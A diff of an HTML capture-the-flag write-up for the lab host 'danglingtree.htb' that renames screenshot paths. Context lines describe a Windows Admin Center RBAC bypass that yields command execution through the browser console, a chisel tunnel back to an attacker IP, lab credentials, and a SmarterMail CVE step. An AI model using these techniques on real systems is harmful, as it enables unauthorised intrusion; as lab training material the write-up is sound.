@@ -82,31 +82,31 @@ nxc smb <span class="ph">&lt;target-ip&gt;</span> -d danglingtree.htb -u anderso
           <p>Log in at <code>https://danglingtree.htb:6600/</code> with <code>anderson.w</code> / <code>R3dT3am@Acc3ss#01</code>.</p>
 
           <div class="note-image">
-            <img src="../src/images/danglingtree-wac-login.png" alt="Windows Admin Center sign-in" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-1.png" alt="Windows Admin Center sign-in" onclick="toggleZoom(this)">
           </div>
 
           <p>Connecting to the gateway as <code>anderson.w</code> is blocked by RBAC in the UI:</p>
 
           <div class="note-image">
-            <img src="../src/images/danglingtree-wac-rbac-error.png" alt="WAC connection error — blocked by RBAC" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-2.png" alt="WAC connection error — blocked by RBAC" onclick="toggleZoom(this)">
           </div>
 
           <p>WAC reports version <strong>2511</strong> / build <strong>2.6.4.11</strong>:</p>
 
           <div class="note-image">
-            <img src="../src/images/danglingtree-wac-version.png" alt="WAC version 2511 build 2.6.4.11" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-3.png" alt="WAC version 2511 build 2.6.4.11" onclick="toggleZoom(this)">
           </div>
 
           <p>From the browser console, the SME PowerShell endpoint still accepts commands via <code>invokeWac</code> — UI RBAC is bypassed. <code>whoami; hostname</code> returns <code>danglingtree\anderson.w</code> / <code>dc</code>:</p>
 
           <div class="note-image">
-            <img src="../src/images/danglingtree-wac-console-rce.png" alt="Browser console RCE as anderson.w" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-4.png" alt="Browser console RCE as anderson.w" onclick="toggleZoom(this)">
           </div>
 
                     <p>Module in use: <code>msft.sme.shell</code> <strong>6.8.9</strong>.</p>
 
           <div class="note-image">
-            <img src="../src/images/danglingtree-wac-sme-shell.png" alt="msft.sme.shell version 6.8.9" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-5.png" alt="msft.sme.shell version 6.8.9" onclick="toggleZoom(this)">
           </div>
 
           <h3>Confirm RCE — <code>invokeWac</code> helper</h3>
@@ -199,7 +199,7 @@ C:\Windows\Temp\chisel.exe client <span class="ph">&lt;attacker-ip&gt;</span>:80
           <p>Browse <code>http://127.0.0.1:17017</code>:</p>
 
           <div class="note-image">
-            <img src="../src/images/danglingtree-smartermail.png" alt="SmarterMail login via Chisel" onclick="toggleZoom(this)">
+            <img src="../src/images/danglingtree/danglingtree-6.png" alt="SmarterMail login via Chisel" onclick="toggleZoom(this)">
           </div>
 
           <h3>CVE-2026-23760 — SmarterMail → <code>svc_mail</code></h3>
